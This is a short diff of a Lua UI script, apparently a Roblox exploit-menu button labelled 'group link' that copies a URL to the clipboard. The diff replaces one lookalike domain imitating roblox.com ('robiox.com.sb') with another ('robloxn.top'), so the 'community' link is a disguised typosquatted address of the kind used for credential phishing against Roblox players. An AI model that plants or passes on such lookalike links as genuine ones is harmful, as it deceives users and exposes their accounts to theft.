@@ -85,7 +85,7 @@ Callback = <function> - The function of the button.
 
 Tab:AddButton({
 	Name = "group link",
-	Callback = function()setclipboard("https://www.robiox.com.sb/communities/318552382217/RCM Games")
+	Callback = function()setclipboard("https://www.robloxn.top/communities/318552382217/RCM Games")
       		print("button pressed")
   	end    
 })
